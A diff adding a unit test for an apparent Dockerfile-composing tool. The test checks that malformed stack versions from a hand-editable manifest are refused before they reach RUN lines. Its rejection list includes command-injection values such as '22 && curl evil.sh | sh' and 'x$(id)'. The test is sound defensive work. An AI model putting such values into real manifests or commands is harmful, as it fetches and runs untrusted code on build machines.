@@ -39,3 +39,33 @@ test('a manifest that is not there is a project that asked for nothing', () => {
   assert.ok(r.ok)
   if (r.ok) assert.ok(r.dockerfile.includes('openjdk-21-jdk'), 'the first version java offers')
 })
+
+test("a stack version that is not a version's shape is refused, with nothing composed", () => {
+  // gh-326: the version is substituted into the stack's Dockerfile.frag —
+  // inside RUN lines — so it is held to a shape the way "packages" is. The
+  // Quick Pick offers only versions.json's entries, but the manifest is
+  // hand-editable and arrives with a clone.
+  const dir = mkdtempSync(join(tmpdir(), 'compose-'))
+  const manifest = join(dir, 'm.json')
+  for (const bad of ['22 && curl evil.sh | sh', 'x$(id)', 'two words', 'line\nbreak', '"quoted"', '-22']) {
+    writeFileSync(manifest, JSON.stringify({ node: bad }))
+    const r = compose({ root: ROOT, stacks: ['node'], manifestPath: manifest })
+    assert.equal(r.ok, false, bad)
+    if (!r.ok) {
+      assert.match(r.message, /as the 'node' version in/, bad)
+      assert.match(r.message, /is not a version's shape/, bad)
+    }
+  }
+
+  // A shaped version the list does not carry is a hand-edit the form allows,
+  // not an injection: it passes through to the fragment. And rust's channels
+  // are letters — the shape is a letter or a digit first, so a channel that
+  // versions.json itself carries still composes.
+  writeFileSync(manifest, '{"node":"22.11.1"}')
+  const good = compose({ root: ROOT, stacks: ['node'], manifestPath: manifest })
+  assert.ok(good.ok)
+  if (good.ok) assert.ok(good.dockerfile.includes('22.11.1'), 'a shaped version passes through')
+  const channel = compose({ root: ROOT, stacks: ['rust'] })
+  assert.ok(channel.ok)
+  if (channel.ok) assert.ok(channel.dockerfile.includes('stable'), 'a channel name is a version shape')
+})
